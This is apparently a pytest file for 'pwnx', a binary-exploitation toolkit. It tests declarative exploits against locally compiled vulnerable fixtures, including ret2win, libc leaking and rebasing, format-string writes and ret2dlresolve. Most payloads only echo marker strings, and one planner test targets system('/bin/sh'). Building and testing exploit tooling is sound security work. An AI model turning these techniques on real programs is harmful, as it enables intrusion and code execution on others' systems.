from __future__ import annotations

import subprocess
from pathlib import Path

from pwnx import (
    Challenge,
    Trace,
    dynamic_call,
    expect,
    format_string,
    pointer,
    raw,
    technique,
)


def _libc_path() -> Path:
    result = subprocess.check_output(
        ["gcc", "-print-file-name=libc.so.6"], text=True
    ).strip()
    return Path(result).resolve()


def _loader_path() -> Path:
    result = subprocess.check_output(
        ["gcc", "-print-file-name=ld-linux-x86-64.so.2"], text=True
    ).strip()
    path = Path(result).resolve()
    if not path.is_file():
        raise AssertionError(f"compiler returned invalid loader path: {result}")
    return path


def _format_offset(binary: Path) -> int:
    for position in range(1, 80):
        output = subprocess.check_output(
            [str(binary)],
            input=f"AAAABBBB%{position}$p\n".encode(),
            timeout=3,
        )
        if b"0x4242424241414141" in output:
            return position
    raise AssertionError("format-string argument was not found")


def test_declarative_ret2win_and_replay(compiled_fixtures):
    binary = compiled_fixtures["ret2win"]
    c = Challenge(binary)
    c.control(raw(b"payload: "), return_at=72)
    c.want(c.exe.win())
    c.want(expect(b"PWNX_RET2WIN_OK\n"))

    trace = Trace()
    with c.run(trace=trace):
        pass
    with c.run(replay=trace):
        pass


def test_declarative_direct_observation_rebases_libc(compiled_fixtures):
    binary = compiled_fixtures["direct_libc"]
    c = Challenge(binary, libc=_libc_path())
    c.observe("puts: {libc.puts:hex}\n")
    c.control(raw(b"payload: "), return_at=72)
    c.want(c.libc.system("echo PWNX_DIRECT_OK"))
    c.want(expect(b"PWNX_DIRECT_OK\n"))

    plan = c.plan()
    with plan.run() as run:
        assert run.value(c.libc.base) > 0


def test_supplied_loader_and_libc_drive_real_local_execution(compiled_fixtures):
    binary = compiled_fixtures["direct_libc"]
    c = Challenge(binary, libc=_libc_path(), loader=_loader_path())
    c.observe("puts: {libc.puts:hex}\n")
    c.control(raw(b"payload: "), return_at=72)
    c.want(c.libc.system("echo PWNX_DIRECT_OK"))
    c.want(expect(b"PWNX_DIRECT_OK\n"))

    trace = Trace()
    with c.run(trace=trace):
        pass
    with c.run(replay=trace):
        pass
    assert trace.metadata["artifacts"]["loader"]["sha256"]
    assert trace.metadata["launch"]["argv"][0] == str(_loader_path())


def test_planner_preserves_real_applicable_alternative(compiled_fixtures):
    binary = compiled_fixtures["dlresolve"]
    c = Challenge(binary, libc=_libc_path())
    c.control(raw(b"payload: "), return_at=72)
    c.assume(c.libc.base, 0x7F0000000000, reason="plan-only candidate test")
    c.want(c.libc.system("/bin/sh"), terminal=False)

    plan = c.plan()
    assert plan.selected_tactic == "rop"
    assert [item["name"] for item in plan.alternatives] == ["dlresolve"]


def test_run_exposes_local_maps_libraries_and_memory(compiled_fixtures):
    binary = compiled_fixtures["direct_libc"]
    c = Challenge(binary)
    c.want(expect(b"puts: "))

    with c.run() as run:
        assert run.maps.find(c.exe.symbols["direct_command"]) is not None
        assert any("libc.so" in path for path in run.libs)
        assert run.read_memory(
            c.exe.symbols["direct_command"],
            len(b"echo PWNX_DIRECT_OK\0"),
        ) == b"echo PWNX_DIRECT_OK\0"
        oracle = run.memory_oracle(max_read=8)
        assert oracle.cstring(c.exe.symbols["direct_command"]) == b"echo PWNX_DIRECT_OK"


def test_declarative_staged_leak_rebase_and_call(compiled_fixtures):
    binary = compiled_fixtures["staged_libc"]
    c = Challenge(binary, libc=_libc_path())
    overflow = c.control(raw(b"payload: "), return_at=72)
    c.learn(
        c.libc.puts,
        using=c.exe.write(1, c.exe.got.puts, 8),
        receive=pointer(8),
        resume=c.exe.main,
        via=overflow,
    )
    c.want(c.libc.system("echo PWNX_STAGE2_OK"))
    c.want(expect(b"PWNX_STAGE2_OK\n"))

    plan = c.plan()
    assert len(plan.stages) == 3
    with plan.run() as run:
        assert run.value(c.libc.base) > 0


def test_declarative_format_write(compiled_fixtures):
    binary = compiled_fixtures["format_string"]
    c = Challenge(binary)
    fmt = c.control(
        format_string(b"format: ", offset=_format_offset(binary))
    )
    c.want(fmt.write(c.exe.hook, c.exe.win))
    c.want(expect(b"PWNX_FMT_OK\n"))

    with c.run():
        pass


def test_declarative_ret2dlresolve(compiled_fixtures):
    binary = compiled_fixtures["dlresolve"]
    c = Challenge(binary)
    c.control(raw(b"payload: "), return_at=72)
    c.want(
        dynamic_call("system", "echo PWNX_DLRESOLVE_OK"),
        using=technique.dlresolve,
    )
    c.want(expect(b"PWNX_DLRESOLVE_OK\n"))

    plan = c.plan()
    assert plan.selected_tactic == "dlresolve+actions"
    with plan.run():
        pass
